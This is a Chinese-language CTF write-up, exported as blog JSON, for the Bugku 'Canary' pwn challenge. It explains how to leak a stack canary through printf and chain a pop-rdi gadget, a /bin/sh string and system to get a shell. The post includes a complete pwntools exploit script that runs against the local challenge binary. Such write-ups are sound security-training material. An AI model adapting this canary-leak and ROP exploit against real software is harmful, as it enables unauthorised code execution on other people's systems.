{"title":"Bugku pwn","uid":"144f81ea5594fe5e9363a228d67919cf","slug":"Bugku-PWN","date":"2021-07-03T14:10:52.000Z","updated":"2021-07-03T14:46:12.563Z","comments":true,"path":"api/articles/Bugku-PWN.json","keywords":null,"cover":[],"content":"<h1 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h1><p>看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护<img src=\"https://i.loli.net/2021/07/03/4kYTmvGypHW5uA1.png\" alt=\"image.png\"></p>\n<p>查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间<img src=\"https://i.loli.net/2021/07/03/MjuLO6KPTU42YZH.png\" alt=\"image.png\"></p>\n<p>查看字符串，发现存在bin/sh，在函数表里面也存在system函数<img src=\"https://i.loli.net/2021/07/03/YjeM5z9T8chxFtN.png\" alt=\"屏幕截图 2021-07-03 222006.png\"></p>\n<p>所以思路大概出来了，利用gadgets来获取shell。接下来就是思考如何解决canary保护，观察伪代码，里面有printf函数，我们可以利用printf函数来泄露canary，printf函数输出时会以x00为输出结尾，只要我们将canary值的x00覆盖掉就可以泄露了。</p>\n<p>所以，第一步，获取gadgets。因为是64位程序，所以传参时前六个参数是利用rdi, rsi, rdx, rcx, r8, r9寄存器来传递，所以需要将bin/sh传递到rdi寄存器。<img src=\"https://i.loli.net/2021/07/03/2RT6YD3ZijuXmnK.png\" alt=\"image.png\"></p>\n<p>接下来就是泄露canary，buf的偏移量是0x240-8(减8是因为canary的值在ebp减8的位置)，之后利用printf函数泄露即可。<img src=\"https://i.loli.net/2021/07/03/B8UpxXibkZD2VlI.png\" alt=\"image.png\"></p>\n<p>最后再组装一下就可以得出exp了。</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn4_&#x27;</span>)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400963</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x601068</span></span><br><span class=\"line\">sys = <span class=\"number\">0x40080C</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x240</span> - <span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#减8是因为canary的值在ebp减8的位置,换行符覆盖了x00</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Please leave your name(Within 36 Length):&#x27;</span>, payload)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\"><span class=\"comment\">#接收至换行符</span></span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#补全canary</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\"><span class=\"comment\">#输出canary</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x210</span> - <span class=\"number\">8</span>) + canary + <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;Please leave a message(Within 0x200 Length):&#x27;</span> , payload1)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","feature":true,"text":"Canary看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护 查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间 查看字符串，发现存在bin/sh，在函数表里面也存在system函数...","link":"","photos":[],"count_time":{"symbolsCount":"1k","symbolsTime":"1 mins."},"categories":[{"name":"PWN","slug":"PWN","count":4,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Canary\"><span class=\"toc-text\">Canary</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"ROP","uid":"4a7667facf84943d5e400f474fc547ee","slug":"ROP","date":"2021-06-05T10:23:30.000Z","updated":"2021-06-20T02:20:11.833Z","comments":true,"path":"api/articles/ROP.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/3ZBmwPkcIXjUE17.jpg","text":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadge...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"PWN","slug":"PWN","count":4,"path":"api/categories/PWN.json"}],"tags":[{"name":"积累","slug":"积累","count":2,"path":"api/tags/积累.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}